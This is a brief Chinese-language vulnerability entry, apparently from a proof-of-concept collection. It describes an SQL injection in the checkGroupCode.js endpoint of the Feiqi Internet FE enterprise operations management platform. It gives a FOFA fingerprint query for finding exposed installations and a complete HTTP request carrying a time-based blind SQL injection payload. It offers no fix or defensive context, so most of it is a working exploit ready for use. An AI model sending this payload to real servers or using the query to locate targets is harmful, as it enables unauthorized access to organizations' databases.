# 飞企互联FE企业运营管理平台checkGroupCode.js接口存在SQL注入漏洞

飞企互联-FE企业运营管理平台接口/docexchangeManage/checkGroupCode.js 存在SQL注入漏洞，可获取数据库数据。

## fofa

```
app="飞企互联-FE企业运营管理平台"
```

## poc

```
GET /docexchangeManage/checkGroupCode.js%70?code=1%27;waitfor+delay+%270:0:4%27--+ HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

